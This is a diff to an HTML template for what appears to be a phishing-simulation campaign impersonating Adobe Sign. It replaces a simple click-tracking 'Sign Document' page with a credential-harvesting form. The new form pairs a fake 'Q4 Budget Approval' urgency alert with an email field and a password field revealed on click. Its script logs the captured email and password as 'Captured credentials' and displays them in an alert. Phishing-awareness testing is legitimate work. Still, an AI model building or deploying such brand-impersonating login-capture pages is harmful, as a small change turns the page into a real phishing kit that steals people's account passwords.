@@ -3,216 +3,175 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adobe Sign - Document Awaiting Your Signature</title>
+    <title>Sign Document - Adobe Sign</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
             background: #f5f5f5;
-            padding: 40px 20px;
-        }
-        .container {
-            max-width: 520px;
-            margin: 0 auto;
+            min-height: 100vh;
         }
         .header {
-            background: #fff;
-            padding: 20px 24px;
-            border-radius: 8px 8px 0 0;
+            background: white;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 16px 24px;
             display: flex;
             align-items: center;
-            gap: 12px;
-            border-bottom: 1px solid #e5e5e5;
+            justify-content: space-between;
         }
-        .logo-icon {
-            width: 36px;
-            height: 36px;
-            background: #fa0f00;
-            border-radius: 6px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            font-weight: 700;
-            font-size: 18px;
-        }
-        .logo-text {
-            font-size: 20px;
-            color: #333;
-        }
-        .logo-text span { color: #fa0f00; }
-        .content {
-            background: #fff;
-            padding: 32px 24px;
-            border-radius: 0 0 8px 8px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
-        }
-        .doc-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: #fff3e0;
-            color: #e65100;
-            padding: 6px 12px;
-            border-radius: 4px;
-            font-size: 12px;
-            font-weight: 500;
-            margin-bottom: 20px;
-        }
-        h1 {
+        .logo {
             font-size: 20px;
             font-weight: 600;
-            color: #222;
-            margin-bottom: 12px;
+            color: #0679DE;
         }
-        .message {
+        .logo span { color: #333; }
+        .user-info {
             font-size: 14px;
-            color: #555;
-            line-height: 1.7;
-            margin-bottom: 24px;
+            color: #666;
         }
-        .message strong { color: #222; }
-        .doc-info {
-            background: #f8f8f8;
-            border: 1px solid #e5e5e5;
-            border-radius: 6px;
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+        .doc-card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            overflow: hidden;
+        }
+        .doc-header {
+            padding: 24px 32px;
+            border-bottom: 1px solid #e8e8e8;
+        }
+        .doc-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+        .doc-meta {
+            font-size: 14px;
+            color: #666;
+        }
+        .doc-body {
+            padding: 32px;
+        }
+        .alert {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 4px;
             padding: 16px;
             margin-bottom: 24px;
+            font-size: 14px;
+            color: #856404;
         }
-        .doc-info-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 8px 0;
-            font-size: 13px;
-            border-bottom: 1px solid #eee;
+        .alert strong { display: block; margin-bottom: 4px; }
+        .form-group {
+            margin-bottom: 20px;
         }
-        .doc-info-row:last-child { border-bottom: none; }
-        .doc-info-label { color: #888; }
-        .doc-info-value { color: #333; font-weight: 500; }
-        .btn-sign {
+        .form-group label {
             display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 8px;
+        }
+        .form-group input {
             width: 100%;
-            padding: 14px;
-            background: #fa0f00;
-            color: #fff;
-            border: none;
-            border-radius: 6px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            text-align: center;
-            text-decoration: none;
-            transition: background 0.2s;
-        }
-        .btn-sign:hover { background: #d40d00; }
-        .btn-secondary {
-            display: block;
-            text-align: center;
-            margin-top: 12px;
-            font-size: 13px;
-            color: #666;
-            text-decoration: none;
-        }
-        .btn-secondary:hover { text-decoration: underline; }
-        .expires {
-            text-align: center;
-            font-size: 12px;
-            color: #d32f2f;
-            margin-top: 16px;
-            padding: 10px;
-            background: #fff3f3;
+            padding: 12px 16px;
+            border: 1px solid #ddd;
             border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+        }
+        .form-group input:focus {
+            border-color: #0679DE;
+            box-shadow: 0 0 0 3px rgba(6,121,222,0.1);
+        }
+        .btn-sign {
+            background: #0679DE;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 14px 32px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+        }
+        .btn-sign:hover {
+            background: #055fb5;
         }
         .footer {
-            margin-top: 24px;
             text-align: center;
-            font-size: 11px;
+            padding: 24px;
+            font-size: 12px;
             color: #999;
-            padding: 20px;
         }
-        .footer a { color: #666; text-decoration: none; margin: 0 8px; }
+        .footer a { color: #0679DE; text-decoration: none; }
+        .tracking { display: none; }
     </style>
 </head>
 <body>
+    <div class="header">
+        <div class="logo">Adobe <span>Sign</span></div>
+        <div class="user-info">Document Request</div>
+    </div>
     <div class="container">
-        <div class="header">
-            <div class="logo-icon">A</div>
-            <div class="logo-text">Adobe <span>Sign</span></div>
-        </div>
-        
-        <div class="content">
-            <div class="doc-badge">📄 Document Awaiting Signature</div>
-            
-            <h1>{{ recipient_name }}, you have a document to sign</h1>
-            
-            <p class="message">
-                <strong>{{ sender_name }}</strong> has sent you a document for your electronic signature. 
-                This document requires your attention within <strong>24 hours</strong>.
-            </p>
-            
-            <div class="doc-info">
-                <div class="doc-info-row">
-                    <span class="doc-info-label">Document</span>
-                    <span class="doc-info-value">{{ doc_name }}</span>
-                </div>
-                <div class="doc-info-row">
-                    <span class="doc-info-label">Sent by</span>
-                    <span class="doc-info-value">{{ sender_name }}</span>
-                </div>
-                <div class="doc-info-row">
-                    <span class="doc-info-label">Expires</span>
-                    <span class="doc-info-value" style="color:#d32f2f;">{{ expiry_date }}</span>
-                </div>
+        <div class="doc-card">
+            <div class="doc-header">
+                <h1 class="doc-title">Q4 Budget Approval Required</h1>
+                <p class="doc-meta">Sent by: finance@company.com · Due: Today</p>
             </div>
-            
-            <form onsubmit="handleSign(event)">
-                <button type="submit" class="btn-sign">Sign Document</button>
-            </form>
-            
-            <a href="#" class="btn-secondary">Need help? Contact Support</a>
-            
-            <div class="expires">
-                ⏰ This invitation expires in <span id="countdown">{{ expiry_time }}</span>
+            <div class="doc-body">
+                <div class="alert">
+                    <strong>⚠️ Action Required</strong>
+                    This document requires your electronic signature by end of business today.
+                </div>
+                <form id="signForm">
+                    <div class="form-group">
+                        <label for="email">Email Address</label>
+                        <input type="email" id="email" name="email" placeholder="your@email.com" required>
+                    </div>
+                    <div class="form-group" id="passwordGroup" style="display:none;">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" placeholder="Enter your password">
+                    </div>
+                    <button type="submit" class="btn-sign" id="submitBtn">Sign Document</button>
+                </form>
             </div>
         </div>
-        
         <div class="footer">
             <p>© 2026 Adobe Systems Incorporated. All rights reserved.</p>
-            <p style="margin-top:8px;">
-                <a href="#">Privacy</a> · 
-                <a href="#">Terms</a> · 
-                <a href="#">Help</a>
-            </p>
+            <p style="margin-top:8px;"><a href="#">Privacy Policy</a> · <a href="#">Terms</a> · <a href="#">Help</a></p>
         </div>
     </div>
-    
+    <div class="tracking" id="tracking"></div>
     <script>
-        function handleSign(e) {
-            e.preventDefault();
-            fetch('/track/submit?campaign={{ campaign_id }}&variant={{ variant_id }}&email={{ recipient_email }}', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({action: 'sign', timestamp: Date.now()})
-            }).catch(() => {});
-            document.querySelector('.content').innerHTML = 
-                '<div style="padding:40px 0;text-align:center;">' +
-                '<div style="font-size:48px;margin-bottom:16px;">✅</div>' +
-                '<h2 style="color:#222;margin-bottom:12px;">Document Signed</h2>' +
-                '<p style="color:#555;">Thank you, ' + '{{ recipient_name }} + '!</p>' +
-                '<p style="color:#888;font-size:12px;margin-top:24px;">This is a simulation. No document was sent.</p>' +
-                '</div>';
-        }
+        const params = new URLSearchParams(window.location.search);
+        const campaignId = params.get('campaign') || 'unknown';
+        const variant = params.get('variant') || 'unknown';
+        const userId = params.get('user') || 'unknown';
+        console.log('Campaign:', campaignId, 'Variant:', variant, 'User:', userId);
         
-        // Countdown timer
-        let mins = 23, secs = 59;
-        function updateTimer() {
-            document.getElementById('countdown').textContent = 
-                mins.toString().padStart(2,'0') + ':' + secs.toString().padStart(2,'0');
-            if (secs > 0) { secs--; } 
-            else if (mins > 0) { mins--; secs = 59; }
-            setTimeout(updateTimer, 1000);
-        }
-        updateTimer();
+        const emailInput = document.getElementById('email');
+        const passwordGroup = document.getElementById('passwordGroup');
+        const submitBtn = document.getElementById('submitBtn');
+        
+        submitBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            if (!passwordGroup.style.display || passwordGroup.style.display === 'none') {
+                passwordGroup.style.display = 'block';
+                submitBtn.textContent = 'Confirm & Sign';
+                document.getElementById('password').focus();
+            } else {
+                const email = emailInput.value;
+                const password = document.getElementById('password').value;
+                alert('TEST MODE: Document signed successfully\n\nEmail: ' + email + '\nPassword: ' + password + '\n\nCampaign: ' + campaignId + '\nVariant: ' + variant);
+                console.log('Captured credentials:', { email, password, campaignId, variant, userId });
+            }
+        });
     </script>
 </body>
 </html>
